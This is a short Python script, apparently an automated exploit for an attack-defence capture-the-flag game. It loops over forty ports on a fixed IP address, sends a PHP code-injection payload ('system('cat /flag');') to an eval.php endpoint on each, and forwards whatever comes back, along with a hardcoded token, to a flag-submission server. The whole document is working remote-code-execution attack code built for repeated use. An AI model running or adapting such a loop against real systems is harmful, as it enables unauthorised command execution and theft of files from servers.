import requests
import time

def postFlag(flag):
    url="http://39.98.115.161:9090"
    post={"flag":flag,"token":"39d96770ab4bfa72da8cc15a6783ec6f"}
    result=requests.post(url,post)
    print(result.text)

while(1):
    for i in range(1,41):
        tmp=i
        if i<10:
            tmp="0"+str(i)
        url="http://39.98.115.161:88"+str(tmp)+"/eval.php"
        post={"a":"system('cat /flag');"}
        result= requests.post(url,post)
        print(result.text)
        postFlag(result.text)
    time.sleep(300*1000)


